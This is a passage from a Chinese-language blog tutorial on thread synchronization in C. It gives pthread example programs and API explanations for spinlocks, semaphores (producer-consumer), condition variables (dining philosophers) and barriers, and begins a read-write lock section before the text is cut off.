class="line"></span><br></pre></td></tr></table></figure><p>未加锁：<br><img src="/2022/05/10/%E7%BA%BF%E7%A8%8B%E7%9A%84%E5%90%8C%E6%AD%A5%E4%BA%92%E6%96%A5/image-20220510142206661.png" alt="未加锁"></p><p>加锁：<br><img src="/2022/05/10/%E7%BA%BF%E7%A8%8B%E7%9A%84%E5%90%8C%E6%AD%A5%E4%BA%92%E6%96%A5/image-20220510140450091.png" alt="加锁"></p><h3 id="312-互斥锁-同步互斥关键代码说明"><a class="markdownIt-Anchor" href="#312-互斥锁-同步互斥关键代码说明"></a> 3.1.2 互斥锁 同步互斥关键代码说明</h3><ol><li><p>pthread_mutex_t lock = PTHREAD_MUTEX_INITIALIZER;<br>//创建全局锁并初始化</p></li><li><p>pthread_mutex_lock(&amp;lock);  //上锁</p></li><li><p>pthread_mutex_unlock(&amp;lock);   //开锁</p></li></ol><h2 id="32-自旋锁-同步互斥方法实现"><a class="markdownIt-Anchor" href="#32-自旋锁-同步互斥方法实现"></a> 3.2 自旋锁 同步互斥方法实现</h2><h3 id="321-自旋锁-同步互斥示例代码"><a class="markdownIt-Anchor" href="#321-自旋锁-同步互斥示例代码"></a> 3.2.1 自旋锁 同步互斥示例代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> ticketAmount = <span class="number">2</span>; <span class="comment">//全局变量</span></span><br><span class="line"><span class="type">pthread_spinlock_t</span> lock;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">ticketAgent</span><span class="params">(<span class="type">void</span>* arg)</span>&#123;</span><br><span class="line">    pthread_spin_lock(&amp;lock);  <span class="comment">//上锁</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> t = ticketAmount;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (t &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;售出一张票!\n&quot;</span>);</span><br><span class="line">        t--;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;票已经卖完了!!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ticketAmount = t;</span><br><span class="line">    pthread_spin_unlock(&amp;lock);        <span class="comment">//解锁</span></span><br><span class="line">    pthread_exit(<span class="number">0</span>);                <span class="comment">//退出线程</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    pthread_spin_init(&amp;lock,PTHREAD_PROCESS_PRIVATE);</span><br><span class="line">    <span class="type">pthread_t</span> ticketAgent_tid[<span class="number">2</span>];   <span class="comment">//创建线程pid</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        pthread_create(ticketAgent_tid+i, <span class="literal">NULL</span>, ticketAgent,<span class="literal">NULL</span>);</span><br><span class="line">    &#125;<span class="comment">//创建两个线程</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        pthread_join(ticketAgent_tid[i],<span class="literal">NULL</span>);</span><br><span class="line">    &#125;<span class="comment">//让主线程等待其它线程完成</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;还剩下 %d张票\n&quot;</span>, ticketAmount);</span><br><span class="line">    pthread_spin_destroy(&amp;lock);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>未加锁：<br><img src="/2022/05/10/%E7%BA%BF%E7%A8%8B%E7%9A%84%E5%90%8C%E6%AD%A5%E4%BA%92%E6%96%A5/image-20220510142626566.png" alt="未加锁"></p><p>加锁：<br><img src="/2022/05/10/%E7%BA%BF%E7%A8%8B%E7%9A%84%E5%90%8C%E6%AD%A5%E4%BA%92%E6%96%A5/image-20220510142535492.png" alt="加锁"></p><h3 id="自旋锁-同步互斥关键代码说明"><a class="markdownIt-Anchor" href="#自旋锁-同步互斥关键代码说明"></a> 自旋锁 同步互斥关键代码说明</h3><ol><li><p>int pthread_spin_init(pthread_spinlock_t *lock, int pshared);<br>//初始化自旋锁，pshared 参数表示自旋锁是否能被其它进程共享。</p></li><li><p>int pthread_spin_destroy(pthread_spinlock_t *lock);<br>//销毁自旋锁，释放其资源</p></li><li><p>Int pthread_spin_lock(pthread_spinlock_t *lock);<br>// 获得锁，如果锁未被占用，则将锁锁上，防止其它进程获得锁，如果锁被占中，则线程将一直循环等待，直到锁被释放获得锁</p></li><li><p>Int pthread_spin_unlock(pthrad_spinlock_t *lock);<br>// 释放锁</p></li></ol><h2 id="号量-同步互斥方法实现"><a class="markdownIt-Anchor" href="#号量-同步互斥方法实现"></a> 号量 同步互斥方法实现</h2><h3 id="信号量-同步互斥示例代码"><a class="markdownIt-Anchor" href="#信号量-同步互斥示例代码"></a> 信号量 同步互斥示例代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NEXTP 1 <span class="comment">//代表有资源</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NEXTC 0<span class="comment">//代表无资源</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> full_v = <span class="number">0</span>;<span class="comment">//统计有产品的位置数，占位数</span></span><br><span class="line"><span class="type">int</span> empty_v = <span class="number">5</span>;<span class="comment">//统计空位数</span></span><br><span class="line"><span class="type">int</span> buff[<span class="number">5</span>]=&#123;<span class="number">0</span>&#125;;<span class="comment">//位置缓冲池</span></span><br><span class="line"><span class="type">int</span> in = <span class="number">0</span>;<span class="comment">//指向下一个空位的索引</span></span><br><span class="line"><span class="type">int</span> out = <span class="number">0</span>;<span class="comment">//指向下一个产品位置的索引</span></span><br><span class="line"><span class="type">sem_t</span> empty;</span><br><span class="line"><span class="type">sem_t</span> full;</span><br><span class="line"><span class="type">sem_t</span> mutex;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print</span><span class="params">(<span class="type">int</span> *buff,<span class="type">int</span> k)</span><span class="comment">//输出数组</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;&#123;&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; k; i++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,*(buff+i));</span><br><span class="line"><span class="keyword">if</span>(i == k - <span class="number">1</span>) <span class="keyword">continue</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;&#125;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">producer</span><span class="params">(<span class="type">void</span>* arg)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"></span><br><span class="line">sem_wait(&amp;empty);<span class="comment">//empty = 0 则阻塞，empty &gt; 0则获取一个信号量，向下执行</span></span><br><span class="line"><span class="keyword">if</span>(empty_v != <span class="number">0</span>)&#123;</span><br><span class="line">empty_v--;</span><br><span class="line"></span><br><span class="line">sem_wait(&amp;mutex);</span><br><span class="line">buff[in] = NEXTP;</span><br><span class="line">in = (in + <span class="number">1</span>)% <span class="number">5</span>;<span class="comment">//实现循环放置</span></span><br><span class="line">print(buff,<span class="number">5</span>);</span><br><span class="line">sem_post(&amp;mutex);<span class="comment">//释放一个信号量</span></span><br><span class="line"></span><br><span class="line">full_v++;</span><br><span class="line">sem_post(&amp;full);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>);</span><br><span class="line">&#125;</span><br><span class="line">pthread_exit(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">consumer</span><span class="params">(<span class="type">void</span>* arg)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">sem_wait(&amp;full);</span><br><span class="line"><span class="keyword">if</span>(full_v != <span class="number">0</span>)&#123;</span><br><span class="line">full_v--;</span><br><span class="line"></span><br><span class="line">sem_wait(&amp;mutex);</span><br><span class="line">buff[out] = NEXTC;</span><br><span class="line">out = (out + <span class="number">1</span>)% <span class="number">5</span>;</span><br><span class="line">print(buff,<span class="number">5</span>);</span><br><span class="line">sem_post(&amp;mutex);</span><br><span class="line"></span><br><span class="line">empty_v++;</span><br><span class="line">sem_post(&amp;empty);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">pthread_exit(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">sem_init(&amp;empty,<span class="number">0</span>,<span class="number">5</span>);</span><br><span class="line">sem_init(&amp;full,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">sem_init(&amp;mutex,<span class="number">0</span>,<span class="number">1</span>);<span class="comment">//创建一个二进制信号量，功能相当于互斥锁</span></span><br><span class="line"></span><br><span class="line"><span class="type">pthread_t</span> tid1,tid2;</span><br><span class="line">pthread_create(&amp;tid1,<span class="literal">NULL</span>,producer,<span class="literal">NULL</span>);</span><br><span class="line">pthread_create(&amp;tid2,<span class="literal">NULL</span>,consumer,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">pthread_join(tid1,<span class="literal">NULL</span>);</span><br><span class="line">pthread_join(tid2,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">sem_destroy(&amp;empty);</span><br><span class="line">sem_destroy(&amp;full);</span><br><span class="line">sem_destroy(&amp;mutex);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>未加锁：<br><img src="/2022/05/10/%E7%BA%BF%E7%A8%8B%E7%9A%84%E5%90%8C%E6%AD%A5%E4%BA%92%E6%96%A5/image-20220510143913504.png" alt="未加锁"></p><p>加锁：<br><img src="/2022/05/10/%E7%BA%BF%E7%A8%8B%E7%9A%84%E5%90%8C%E6%AD%A5%E4%BA%92%E6%96%A5/image-20220510143723815.png" alt="加锁"></p><h3 id="信号量-同步互斥关键代码说明"><a class="markdownIt-Anchor" href="#信号量-同步互斥关键代码说明"></a> 信号量 同步互斥关键代码说明</h3><ol><li><p>要使用信号量，先包含头文件&lt;semaphore.h&gt;</p></li><li><p>sem_t：信号量的数据类型，实际上是个长整型，但除P，V操作外不能对它执行加减操作</p></li><li><p>int sem_init(sem_t *sem, int pshared, unsigned int val);</p><blockquote><p>第一个参数为信号量指针，第二个参数为信号量类型（一般设置为0），第三个为信号量初始值。<br>第二个参数pshared为0时，该进程内所有线程可用，不为0时不同进程间可用。</p></blockquote></li><li><p>int sem_wait(sem_t *sem);</p><blockquote><p>申请一个信号量，当前无可用信号量则等待，有可用信号量时占用一个信号量，对信号量的值减1。</p></blockquote></li><li><p>int sem_post(sem_t *sem);</p><blockquote><p>释放一个信号量，信号量的值加1。</p></blockquote></li><li><p>int sem_destory(sem_t *sem);</p><blockquote><p>销毁信号量。</p></blockquote></li></ol><h2 id="条件变量-同步互斥方法实现"><a class="markdownIt-Anchor" href="#条件变量-同步互斥方法实现"></a> 条件变量 同步互斥方法实现</h2><h3 id="条件变量-同步互斥示例代码"><a class="markdownIt-Anchor" href="#条件变量-同步互斥示例代码"></a> 条件变量 同步互斥示例代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> dining_sum = <span class="number">0</span>;</span><br><span class="line">    <span class="type">pthread_mutex_t</span> mutex[<span class="number">5</span>] = &#123;</span><br><span class="line">    PTHREAD_MUTEX_INITIALIZER,</span><br><span class="line">    PTHREAD_MUTEX_INITIALIZER,</span><br><span class="line">    PTHREAD_MUTEX_INITIALIZER,</span><br><span class="line">    PTHREAD_MUTEX_INITIALIZER,</span><br><span class="line">    PTHREAD_MUTEX_INITIALIZER</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">pthread_cond_t</span> conds[<span class="number">5</span>] = &#123;</span><br><span class="line">PTHREAD_COND_INITIALIZER,</span><br><span class="line">PTHREAD_COND_INITIALIZER,</span><br><span class="line">PTHREAD_COND_INITIALIZER,</span><br><span class="line">PTHREAD_COND_INITIALIZER,</span><br><span class="line">PTHREAD_COND_INITIALIZER</span><br><span class="line">&#125;;  <span class="comment">//标识哲学家</span></span><br><span class="line"><span class="type">int</span> n = <span class="number">0</span>;<span class="comment">//记录正在吃饭的人数</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pickup_forks</span><span class="params">(<span class="type">int</span> philosopher_number)</span><span class="comment">//想吃</span></span><br><span class="line">&#123;</span><br><span class="line">pthread_mutex_lock(&amp;mutex[philosopher_number]);</span><br><span class="line"><span class="keyword">while</span>(dining_sum &gt;= <span class="number">5</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;正在挨饿。。。 &#123;%u&#125;\n&quot;</span>,pthread_self());</span><br><span class="line">pthread_cond_wait(&amp;conds[philosopher_number],&amp;mutex[philosopher_number]);</span><br><span class="line">&#125;</span><br><span class="line">dining_sum++;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;正在吃饭。。。 &#123;%u&#125;\n&quot;</span>,pthread_self());</span><br><span class="line">sleep(<span class="number">0.5</span>);</span><br><span class="line">pthread_mutex_unlock(&amp;mutex[philosopher_number]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">return_forks</span><span class="params">(<span class="type">int</span> philosopher_number)</span><span class="comment">//吃完</span></span><br><span class="line">&#123;</span><br><span class="line">pthread_mutex_lock(&amp;mutex[philosopher_number]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;吃饱了，开始思考问题！ &#123;%u&#125;\n&quot;</span>,pthread_self());</span><br><span class="line">dining_sum--;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;思考完了！！&#123;%u&#125;\n&quot;</span>,pthread_self());</span><br><span class="line">pthread_cond_signal (&amp;conds[philosopher_number]);</span><br><span class="line">pthread_mutex_unlock(&amp;mutex[philosopher_number]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">philosophers</span><span class="params">(<span class="type">void</span>* arg)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">pickup_forks(*(<span class="type">int</span>*)arg);</span><br><span class="line">return_forks(*(<span class="type">int</span>*)arg);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">pthread_t</span> pid[<span class="number">5</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">5</span>; k++)</span><br><span class="line">pthread_create(&amp;pid[k], <span class="literal">NULL</span>, philosophers,(<span class="type">void</span>*)&amp;k);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">5</span>; k++)</span><br><span class="line">pthread_join(pid[k],<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>加锁：<br><img src="/2022/05/10/%E7%BA%BF%E7%A8%8B%E7%9A%84%E5%90%8C%E6%AD%A5%E4%BA%92%E6%96%A5/image-20220510144752297.png" alt="image-20220510144752297"></p><h3 id="条件变量-同步互斥关键代码说明"><a class="markdownIt-Anchor" href="#条件变量-同步互斥关键代码说明"></a> 条件变量 同步互斥关键代码说明</h3><ol><li><p>int pthread_cond_init(pthread_cond_t *restrict cond, const pthread_condattr_t *restrict attr);</p><blockquote><p>初始化条件变量，cond 指明其id，attr 指明其属性</p></blockquote></li><li><p>int pthread_cond_destroy(pthread_cond_t *cond);</p><blockquote><p>销毁条件变量</p></blockquote></li><li><p>int pthread_cond_wait(pthread_cond_t *restict cond ,pthread_mutex_t *restrict mutex);</p><blockquote><p>互斥量对此函数进行保护。调用者把锁住的互斥量传给函数，函数然后自动把调用线程放到等待条件的线程列表上，对互斥量解锁，函数返回时，互斥量再次被锁住。</p></blockquote></li><li><p>int pthread_cond_signal(pthread_cond_t *cond);</p><blockquote><p>该函数通知线程条件已满足，至少能够唤醒一个等待该条件的线程</p></blockquote></li></ol><h2 id="屏障-同步互斥方法实现"><a class="markdownIt-Anchor" href="#屏障-同步互斥方法实现"></a> 屏障 同步互斥方法实现</h2><h3 id="屏障-同步互斥示例代码"><a class="markdownIt-Anchor" href="#屏障-同步互斥示例代码"></a> 屏障 同步互斥示例代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//家庭就餐，要等到所有人入席才能开始吃饭</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DINNERS 3</span></span><br><span class="line"></span><br><span class="line"><span class="type">pthread_barrier_t</span> barrier;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *dinners[DINNERS] = &#123;<span class="string">&quot;爸爸&quot;</span>,<span class="string">&quot;妈妈&quot;</span>,<span class="string">&quot;我&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">person</span><span class="params">(<span class="type">void</span>* arg)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i = (<span class="type">int</span>)arg;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s入席\n&quot;</span>,dinners[i]);</span><br><span class="line">pthread_barrier_wait(&amp;barrier);</span><br><span class="line">pthread_exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">pthread_barrier_init(&amp;barrier,<span class="literal">NULL</span>,DINNERS);</span><br><span class="line"></span><br><span class="line"><span class="type">pthread_t</span> pid[DINNERS];</span><br><span class="line"><span class="type">int</span> k;</span><br><span class="line"><span class="keyword">for</span>(k = <span class="number">0</span>; k &lt; DINNERS; k++)&#123;</span><br><span class="line"><span class="type">int</span> err = pthread_create(&amp;pid[k], <span class="literal">NULL</span>, person,(<span class="type">void</span>*)k);</span><br><span class="line"><span class="keyword">if</span>(err != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;线程创建失败！&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(k = <span class="number">0</span>; k &lt; DINNERS; k++)</span><br><span class="line">pthread_join(pid[k],<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;大家开始吃饭！\n&quot;</span>);</span><br><span class="line">pthread_barrier_destroy(&amp;barrier);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>未加锁：警告不用管<br><img src="/2022/05/10/%E7%BA%BF%E7%A8%8B%E7%9A%84%E5%90%8C%E6%AD%A5%E4%BA%92%E6%96%A5/image-20220510145758194.png" alt="未加锁"></p><p>加锁：警告不用管<br><img src="/2022/05/10/%E7%BA%BF%E7%A8%8B%E7%9A%84%E5%90%8C%E6%AD%A5%E4%BA%92%E6%96%A5/image-20220510145727208.png" alt="加锁"></p><h3 id="屏障-同步互斥关键代码说明"><a class="markdownIt-Anchor" href="#屏障-同步互斥关键代码说明"></a> 屏障 同步互斥关键代码说明</h3><ol><li><p>int pthread_barrier_init(pthread_barrier_t *restrict barrier, const pthread_barrierattr_t *restrict attr, unsigned int count);</p><blockquote><p>对屏障初始化，count规定到达屏障线程的数目。</p></blockquote></li><li><p>int pthread_barrier_destroy(pthread_barrier_t *barrier);</p><blockquote><p>销毁屏障，释放其资源</p></blockquote></li><li><p>int pthread_barrier_wait(pthread_barrier_t *barrier);</p><blockquote><p>当代其它线程到达屏障，当线程数量不满足时，已到达的线程会休眠，<br>直到最后一个线程到达屏障，满足屏障计数，所有线程都被唤醒。</p></blockquote></li></ol><h2 id="读写锁-同步互斥方法实现"><a class="markdownIt-Anchor" href="#读写锁-同步互斥方法实现"></a> 读写锁 同步互斥方法实现</h2><h3 id="读写锁-同步互斥示例代码"><a class="markdownIt-Anchor" href="#读写锁-同步互斥示例代码"></a> 读写锁 同步互斥示例代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 